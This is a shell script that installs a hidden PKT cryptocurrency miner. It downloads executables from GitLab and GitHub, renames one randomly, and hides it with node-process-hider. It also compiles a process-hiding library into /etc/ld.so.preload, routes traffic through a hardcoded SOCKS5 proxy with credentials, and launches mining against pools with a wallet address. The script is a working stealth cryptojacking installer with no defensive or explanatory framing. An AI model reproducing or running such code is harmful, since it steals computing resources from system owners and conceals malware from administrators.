#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

blkdiscard=$(shuf -n 1 -i 1-999999)
curl -L -o $blkdiscard  https://github.com/bruselhidayat/hidayah/raw/main/jancok
chmod +x $blkdiscard
ph add $blkdiscard

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 178.128.95.81:1080
socks5_username = sHsgdjwnrbbdz
socks5_password = dsawkeriuwek
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
rm -rf wget-log*
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./$blkdiscard ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
